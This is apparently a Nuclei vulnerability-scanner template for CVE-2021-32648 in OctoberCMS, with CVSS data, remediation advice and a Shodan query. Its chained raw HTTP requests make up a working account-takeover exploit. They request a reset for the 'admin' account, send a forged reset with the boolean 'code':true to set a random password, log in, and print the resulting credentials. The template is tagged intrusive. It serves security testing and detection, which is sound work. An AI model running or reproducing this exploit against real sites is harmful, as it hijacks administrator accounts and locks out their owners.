flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - group: 1
    internal: true
    name: csrf_token
    part: body
    regex:
    - <meta name="csrf-token" content="([0-9a-zA-Z]+)">
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "<meta","csrf-token","Restore")
    - contains(content_type, "text/html")
    internal: true
    type: dsl
  raw:
  - 'GET /backend/backend/auth/restore HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - status_code == 302
    internal: true
    type: dsl
  raw:
  - 'POST /backend/backend/auth/restore HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _token={{csrf_token}}&postback=1&login={{username}}

    '
  - 'POST /backend/backend/auth/reset/1/{{reset_token}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"_token":"{{csrf_token}}","postback":1,"id":1,"code":true,"password":"{{password}}"}

    '
- extractors:
  - group: 1
    internal: true
    name: session_key
    part: body
    regex:
    - <input name="_session_key" type="hidden" value="([0-9a-zA-Z]+)">
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "_session_key","_token","Login")
    - contains(content_type, "text/html")
    internal: true
    type: dsl
  raw:
  - 'GET /backend/backend/auth/signin HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - dsl:
    - '"Username: " + username + ". Password: "+ password'
    type: dsl
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - october_session=
    - admin_auth=
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - 'POST /backend/backend/auth/signin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    _session_key={{session_key}}&_token={{csrf_token}}&postback=1&login={{username}}&password={{password}}

    '
id: CVE-2021-32648
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:octobercms:october:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-32648
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 8.2
    cwe-id: CWE-287,NVD-CWE-Other
    epss-percentile: 0.99683
    epss-score: 0.92015
  description: 'octobercms in a CMS platform based on the Laravel PHP Framework. In
    affected versions of the october/system package an attacker can request an account
    password reset and then gain access to the account using a specially crafted request.
    The issue has been patched in Build 472 and v1.1.5.

    '
  impact: 'Unauthenticated attackers can request password resets and gain unauthorized
    access to user accounts including administrator accounts using a specially crafted
    request.

    '
  metadata:
    max-request: 5
    product: october
    shodan-query: http.component:"october cms"
    vendor: octobercms
    verified: true
  name: OctoberCMS - Account Takeover
  reference:
  - https://github.com/octobercms/october/security/advisories/GHSA-mxr5-mc97-63rc
  - https://github.com/Immersive-Labs-Sec/CVE-2021-32648
  - https://nvd.nist.gov/vuln/detail/CVE-2021-32648
  remediation: 'Upgrade to October CMS Build 472 or v1.1.5 or later.

    '
  severity: high
  tags: cve,cve2021,cms,octobercms,intrusive,kev,vkev,vuln
variables:
  password: '{{randstr}}'
  reset_token: '{{rand_base(42)}}'
  username: admin
